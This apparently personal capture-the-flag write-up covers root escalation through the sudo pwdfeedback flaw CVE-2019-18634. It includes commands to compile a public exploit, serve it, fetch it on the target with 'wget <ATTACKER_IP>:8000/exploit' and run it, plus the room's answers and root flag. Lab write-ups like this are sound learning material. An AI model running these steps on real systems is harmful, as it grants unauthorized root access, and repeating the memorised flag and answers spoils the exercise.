**Enumeration of privileges**

Now that you have an SSH session, you can grab the user flag. But that shouldn't be enough for you, you need root.  
A good first step for privilege escalation is seeing if you can run sudo. You have the password for the current user, so you can run the command:

sudo -l

![[Pasted image 20240228222507.png]]

This command tells you what commands you can run as the superuser with sudo. Unfortunately, the current user cannot run any commands as root. You may have noticed, however, that when you enter your password you see asterisks. This is not default behaviour. There was a recent CVE released that affects this configuration. The setting is called pwdfeedback.

*When pasting the password, we see the password length indicators. There is a CVE about this:*

	[github.com/saleemrashid/sudo-cve-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

*Copy exploit.c from the repo in the target machine and then compile it with `gcc` :*


![[Pasted image 20240229191032.png]]



Answer the questions below

| Question                                | Answer         |
| --------------------------------------- | -------------- |
| What is the CVE number for the exploit? | CVE-2019-18634 |

| Question                                                                                                                                               | Answer |
| ------------------------------------------------------------------------------------------------------------------------------------------------------ | ------ |
| Find the exploit from [https://github.com/saleemrashid/](https://github.com/saleemrashid/)[](https://github.com/saleemrashid/) and download the files. |        |

| Question                             | Answer |
| ------------------------------------ | ------ |
| Compile the exploit from Kali linux. |        |


```
gcc exploit.c -o exploit
```

Open server:

```
python3 -m http.server 8000
```


| Question                           | Answer |
| ---------------------------------- | ------ |
| SCP the exploit binary to the box. |        |

On **target** machine:

```
$ wget <ATTACKER_IP>:8000/exploit
$ chmod +x exploit
$ ./exploit
```

![[Pasted image 20240228224319.png]]


| Question                   | Answer                                |
| -------------------------- | ------------------------------------- |
| Run the exploit, get root. |                                       |
| What is the root flag?     | thm{af55ada6c2445446eb0606b5a2d3a4d2} |
